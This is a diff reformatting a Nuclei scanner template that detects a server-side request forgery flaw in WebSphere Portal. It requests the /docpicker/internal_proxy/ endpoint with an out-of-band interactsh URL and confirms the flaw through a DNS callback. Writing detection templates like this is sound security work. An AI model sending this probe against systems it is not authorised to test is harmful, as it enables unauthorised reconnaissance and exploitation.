@@ -1,17 +1,21 @@
 id: WebSphere-SSRF
+
 info:
-  author: Excis3
-  description: websphere SSRF https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/
   name: Websphere SSRF
-  severity: High
+  author: Excis3
+  severity: high
+  description: websphere SSRF https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/
   tags: SSRF
+
 requests:
-- matchers:
-  - part: interactsh_protocol
-    type: word
-    words:
-    - dns
-  method: GET
-  path:
-  - '{{BaseURL}}/docpicker/internal_proxy/https/{{interactsh-url}}'
-  - '{{BaseURL}}/docpicker/internal_proxy/http/{{interactsh-url}}'
+  - method: GET
+    path:
+      - "{{BaseURL}}/docpicker/internal_proxy/https/{{interactsh-url}}"
+      - "{{BaseURL}}/docpicker/internal_proxy/http/{{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: 
+          - "dns"
+
